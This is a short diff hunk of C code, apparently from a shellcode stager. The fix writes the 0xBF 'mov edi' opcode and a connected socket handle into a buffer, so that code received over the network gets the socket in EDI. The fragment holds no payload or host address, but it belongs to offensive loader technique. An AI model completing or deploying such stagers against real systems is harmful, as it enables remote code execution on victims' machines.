@@ -68,7 +68,7 @@ int main() {
   int rcvd = 0;         // Track how many bytes we have received. Should match size when done.
   
   // Add assembly to make put our socket in EDI
-  index = 0xBF;
+  index[0] = 0xBF;
   memcpy(index + 1, &ConnectSocket, 4);
   index += 5;
   
